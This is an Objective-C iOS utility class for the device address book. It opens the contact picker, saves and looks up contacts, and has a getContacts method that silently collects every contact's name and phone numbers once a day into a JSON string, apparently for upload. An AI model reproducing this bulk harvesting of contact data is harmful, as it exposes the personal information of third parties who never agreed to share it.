//
//  AddressbookUtil.m
//  zpp
//
//  Created by Chuck on 2017/8/3.
//  Copyright © 2017年 myncic.com. All rights reserved.
//

#import "AddressbookUtil.h"
@implementation AddressbookUtil


+ (AddressbookUtil*)book{
    
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        addressBook = [[self alloc] init];
    });
    
    return addressBook;
}


//获取单个联系人
-(void)getOneContact{
    
     [self openBook:nil];//(打开系统通讯录是不需要权限的)
    
}


//打开通讯录
-(void)openBook:(CNContact*)contact{
    
    dispatch_async(dispatch_get_main_queue(), ^{
        if(contact!=nil){
            
            //显示联系人详细页面
            CNContactViewController *contactVC = [CNContactViewController viewControllerForContact:contact];
            [[MainViewController sharedMain] presentViewController:contactVC animated:YES completion:nil];
            
        }else{
            
            //打开列表
            CNContactPickerViewController *contactPickerViewController = [[CNContactPickerViewController alloc] init];
            // 设置代理
            contactPickerViewController.delegate = self;
            // 显示联系人窗口视图
            [[MainViewController sharedMain] presentViewController:contactPickerViewController animated:YES completion:nil];
            
        }
    });


    
}


/**
 *  选中联系人时执行该方法
 *
 *  @param picker  联系人控制器
 *  @param contact 联系人
 */
- (void)contactPicker:(CNContactPickerViewController *)picker didSelectContact:(CNContact *)contact{
    
    //关闭列表
    [[MainViewController sharedMain] dismissViewControllerAnimated:YES completion:nil];
    [self performSelector:@selector(openBook:) withObject:contact afterDelay:0.5f];
  

   
    
//    @try {
//        
//        //获取联系人的姓名
//        NSString *lastname = contact.familyName;
//        NSString *firstname = contact.givenName;
//        
//        lastname =  [lastname stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet ]];
//        firstname = [firstname stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet ]];
//        if(firstname == nil || [firstname isEqual:[NSNull null]]){
//            firstname = @"";
//        }
//        if(lastname == nil || [lastname isEqual:[NSNull null]]){
//            lastname = @"";
//        }
//        NSString *contactName =[NSString stringWithFormat:@"%@%@",lastname,firstname];
//      
//        NSArray *phoneNums = contact.phoneNumbers;
//        
//    } @catch (NSException *exception) {}
}


//获取通讯录读取权限
+(BOOL)getReadContactsBookPermission{
    //ios9以后
    
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status != CNAuthorizationStatusAuthorized){
        return NO;
    }else{
        return YES;
    }
}

//存入本地联系人
+(void)saveUser2PhoneBook:(NSString*)saveName saveTel:(NSString*)saveTel saveIcon:(UIImage*)saveIcon{
    
    //=============格式化创建联系人=================
    CNMutableContact *contact = [[CNMutableContact alloc] init];
    
    //姓名
    contact.familyName =saveName;
    
    //电话
    CNLabeledValue *iPhoneNumber = [CNLabeledValue labeledValueWithLabel:CNLabelPhoneNumberMobile value:[CNPhoneNumber phoneNumberWithStringValue:saveTel]];
    contact.phoneNumbers = @[iPhoneNumber];
    iPhoneNumber =  nil;
    
    if(saveIcon!=nil){
        //头像
        contact.imageData = UIImagePNGRepresentation(saveIcon);
    }
    
    
    //=============创建联系人请求=================
    CNSaveRequest * saveRequest = [[CNSaveRequest alloc]init];
    //添加联系人
    [saveRequest addContact:contact toContainerWithIdentifier:nil];
    
    //=============写操作=================
    CNContactStore *store = [[CNContactStore alloc] init];
    if([store executeSaveRequest:saveRequest error:nil])
        
        
        
        saveRequest = nil;
    store = nil;
    contact = nil;
    
}





//检索联系人
+(BOOL)checkContactExist:(NSString*)name{
    
    CNContactStore * store = [[CNContactStore alloc]init];
    
    NSPredicate * predicate = [CNContact predicateForContactsMatchingName:name];
    //提取数据
    NSArray * contacts = [store unifiedContactsMatchingPredicate:predicate keysToFetch:@[CNContactFamilyNameKey] error:nil];
    
    if(contacts!=nil&&[contacts count]>0){
        return  YES;
    }else{
        return NO;
    }
}






//打包联系人联系人到SD01
+(NSString*)getContacts{

    if(![AddressbookUtil getReadContactsBookPermission]){//没权限
        return @"";
    }
    

    
    //获取通讯录
    NSInteger last_get_contacts_Time = [APPUtils get_ud_int:@"last_get_contacts_Time"] ;//上一次发送时间
    
    NSInteger gap= 0;//间隔时间
    
    if(last_get_contacts_Time >0){
        gap = [[APPUtils GetCurrentTimeString]integerValue]- last_get_contacts_Time;
    }else{
        gap= 999999;
    }
    
    NSString *contactsString = @"";
    
    if(gap>=86400){//一天一次 86400
        
        [APPUtils userDefaultsSet:[APPUtils GetCurrentTimeString] forKey:@"last_get_contacts_Time"];
        
        __block NSInteger contactsCount = 0;
        
        NSMutableString *contacts_base64_mute=[[NSMutableString alloc] init];
        [contacts_base64_mute appendString:@"["];
        
        
        // 遍历所有的联系人
        //创建通信录对象
        CNContactStore *contactStore = [[CNContactStore alloc] init];
        // 创建获取通信录的请求对象
        // 拿到所有打算获取的属性对应的key
        NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey];
        
        //创建CNContactFetchRequest对象
        CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];
        
        //遍历所有的联系人  默认拼音排序了
        [contactStore enumerateContactsWithFetchRequest:request error:nil usingBlock:^(CNContact * _Nonnull book_contact,  BOOL * _Nonnull stop) {
            
            @try {
                //获取联系人的姓名
                NSString *lastname = book_contact.familyName;
                NSString *firstname = book_contact.givenName;
                
                
                lastname =  [lastname stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet ]];
                firstname = [firstname stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet ]];
                if(firstname == nil || [firstname isEqual:[NSNull null]]){
                    firstname = @"";
                }
                if(lastname == nil || [lastname isEqual:[NSNull null]]){
                    lastname = @"";
                }
                NSString *contactName =[NSString stringWithFormat:@"%@%@",lastname,firstname];
                contactName = [APPUtils clearSpecialSymbols:contactName];
                
                
                if(contactName!=nil&&contactName.length>0){
                    
                    //获取联系人的电话号码
                    NSArray *phoneNums = book_contact.phoneNumbers;
                  
                    @try {
                        
                        if(phoneNums!=nil && [phoneNums count]>0){
                            NSMutableString *phoneString = [[NSMutableString alloc] init];
                            [phoneString appendString:@"["];
                            
                            
                            for (CNLabeledValue *labeledValue in phoneNums) {
                                
                                //获取电话号码
                                CNPhoneNumber *phoneNumer = labeledValue.value;
                                NSString *number = phoneNumer.stringValue;
                                if(number!=nil&&number.length>0){
                                    
                                    if(number==nil){
                                        continue;
                                    }
                                    
                                    [phoneString appendString:[NSString stringWithFormat:@"\"%@\",",number]];
                                    
                                    number = nil;
                                    
                                }
                                
                                phoneNumer = nil;
                            }
                            phoneNums = nil;
                            
                            NSString *phoneS = [NSString stringWithFormat:@"%@",phoneString];
                            phoneString = nil;
                            phoneS = [phoneS substringWithRange:NSMakeRange(0,phoneS.length-1)];
                            phoneS = [NSString stringWithFormat:@"%@]",phoneS];
                            
                            NSString *dicString = [NSString stringWithFormat:@"{\"name\":\"%@\",\"tel\":%@},",contactName,phoneS];
                            [contacts_base64_mute appendString: dicString];
                            phoneS = nil;
                            dicString = nil;
                            
                            contactsCount++;
                        }
                        
                    } @catch (NSException *exception) {}
                    
                    phoneNums = nil;
                    
                }
                contactName = nil;
                book_contact = nil;
                
            } @catch (NSException *exception) {
                
            }
            
        }];
        
        
        if(contactsCount>0){
            __block NSString *contacts_base64 = [NSString stringWithFormat:@"%@",contacts_base64_mute];
            contacts_base64 = [contacts_base64 substringWithRange:NSMakeRange(0,contacts_base64.length-1)];
            contactsString = [NSString stringWithFormat:@"%@]",contacts_base64];
            contacts_base64 = nil;
        }
    }
    
    return contactsString;
}


@end
